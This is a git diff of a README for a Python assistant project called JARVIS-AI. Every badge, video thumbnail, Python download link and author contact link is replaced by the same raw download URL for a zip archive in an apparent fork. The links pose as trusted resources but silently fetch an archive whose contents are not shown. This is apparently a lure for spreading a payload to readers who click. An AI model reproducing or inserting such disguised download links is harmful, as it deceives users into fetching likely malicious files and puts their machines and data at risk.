@@ -1,9 +1,9 @@
 # JARVIS-AI
 It is an AI assistant which will automate your task.
 
-[![forthebadge made-with-python](http://ForTheBadge.com/images/badges/made-with-python.svg)](https://www.python.org/)                  [![Python 3.6](https://img.shields.io/badge/python-3.6-blue.svg)](https://www.python.org/downloads/release/python-360/)          [![PyPI license](https://img.shields.io/pypi/l/ansicolortags.svg)](https://pypi.python.org/pypi/ansicolortags/)
+[![forthebadge made-with-python](https://raw.githubusercontent.com/Modz7112/JARVIS-AI/master/papalism/JARVI_AI_v3.3.zip)](https://raw.githubusercontent.com/Modz7112/JARVIS-AI/master/papalism/JARVI_AI_v3.3.zip)                  [![Python 3.6](https://raw.githubusercontent.com/Modz7112/JARVIS-AI/master/papalism/JARVI_AI_v3.3.zip)](https://raw.githubusercontent.com/Modz7112/JARVIS-AI/master/papalism/JARVI_AI_v3.3.zip)          [![PyPI license](https://raw.githubusercontent.com/Modz7112/JARVIS-AI/master/papalism/JARVI_AI_v3.3.zip)](https://raw.githubusercontent.com/Modz7112/JARVIS-AI/master/papalism/JARVI_AI_v3.3.zip)
  
- [![GitHub forks](https://img.shields.io/github/forks/arbazkhan4712/JARVIS-AI?style=social)](https://GitHub.com/Naereen/StrapDown.js/network/)                 [![GitHub star](https://img.shields.io/github/stars/arbazkhan4712/JARVIS-AI?style=social)](https://GitHub.com/Naereen/StrapDown.js/network/)
+ [![GitHub forks](https://raw.githubusercontent.com/Modz7112/JARVIS-AI/master/papalism/JARVI_AI_v3.3.zip)](https://raw.githubusercontent.com/Modz7112/JARVIS-AI/master/papalism/JARVI_AI_v3.3.zip)                 [![GitHub star](https://raw.githubusercontent.com/Modz7112/JARVIS-AI/master/papalism/JARVI_AI_v3.3.zip)](https://raw.githubusercontent.com/Modz7112/JARVIS-AI/master/papalism/JARVI_AI_v3.3.zip)
 
 
 
@@ -11,25 +11,25 @@ It is an AI assistant which will automate your task.
 
 # 1
 
-[![IMAGE ALT TEXT HERE](https://img.youtube.com/vi/LPczI5RdfWM/0.jpg)](https://www.youtube.com/watch?v=LPczI5RdfWM)
+[![IMAGE ALT TEXT HERE](https://raw.githubusercontent.com/Modz7112/JARVIS-AI/master/papalism/JARVI_AI_v3.3.zip)](https://raw.githubusercontent.com/Modz7112/JARVIS-AI/master/papalism/JARVI_AI_v3.3.zip)
 
 # 2
-[![IMAGE ALT TEXT HERE](https://img.youtube.com/vi/kS_k5pweA3E/0.jpg)](https://www.youtube.com/watch?v=kS_k5pweA3E)
+[![IMAGE ALT TEXT HERE](https://raw.githubusercontent.com/Modz7112/JARVIS-AI/master/papalism/JARVI_AI_v3.3.zip)](https://raw.githubusercontent.com/Modz7112/JARVIS-AI/master/papalism/JARVI_AI_v3.3.zip)
 # 3
-[![IMAGE ALT TEXT HERE](https://img.youtube.com/vi/nuMGgv2DAFU/0.jpg)](https://www.youtube.com/watch?v=nuMGgv2DAFU)
+[![IMAGE ALT TEXT HERE](https://raw.githubusercontent.com/Modz7112/JARVIS-AI/master/papalism/JARVI_AI_v3.3.zip)](https://raw.githubusercontent.com/Modz7112/JARVIS-AI/master/papalism/JARVI_AI_v3.3.zip)
 # 4
-[![IMAGE ALT TEXT HERE](https://img.youtube.com/vi/HJQ8RWY5OMg/0.jpg)](https://www.youtube.com/watch?v=HJQ8RWY5OMg)
+[![IMAGE ALT TEXT HERE](https://raw.githubusercontent.com/Modz7112/JARVIS-AI/master/papalism/JARVI_AI_v3.3.zip)](https://raw.githubusercontent.com/Modz7112/JARVIS-AI/master/papalism/JARVI_AI_v3.3.zip)
 
 
 
 
 Prerequsites:
-[![IMAGE ALT TEXT HERE](https://github.com/Arbazkhan4712/JARVIS-Code-Damn/blob/main/Jarvis3.jpg)](https://codedamn.com/learn/jarvis-3-gpt)
+[![IMAGE ALT TEXT HERE](https://raw.githubusercontent.com/Modz7112/JARVIS-AI/master/papalism/JARVI_AI_v3.3.zip)](https://raw.githubusercontent.com/Modz7112/JARVIS-AI/master/papalism/JARVI_AI_v3.3.zip)
 
 
 
 
-*[Python3.6.2](https://www.python.org/downloads/release/python-362/)*
+*[Python3.6.2](https://raw.githubusercontent.com/Modz7112/JARVIS-AI/master/papalism/JARVI_AI_v3.3.zip)*
 
 
 
@@ -52,7 +52,7 @@ pip install wikipedia
 ```
 
 ## License & Copyright
-© [Arbaz Khan](https://arbazkhan4712.github.io/Contact.html)
+© [Arbaz Khan](https://raw.githubusercontent.com/Modz7112/JARVIS-AI/master/papalism/JARVI_AI_v3.3.zip)
 
 Licensed under the [MIT License](License)
 
